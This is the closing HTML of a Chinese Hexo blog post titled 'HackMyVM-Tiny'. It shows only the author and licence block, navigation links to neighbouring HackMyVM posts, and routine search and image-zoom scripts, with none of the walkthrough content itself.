</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://tao0845.github.io/posts/3ca28c17/" title="HackMyVM-Tiny">https://tao0845.github.io/posts/3ca28c17/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/85f65919/" rel="prev" title="HackMyVM-Principle"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">HackMyVM-Principle</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/1861442f/" rel="next" title="HackMyVM-friendly3"><span class="post-nav-text">HackMyVM-friendly3</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>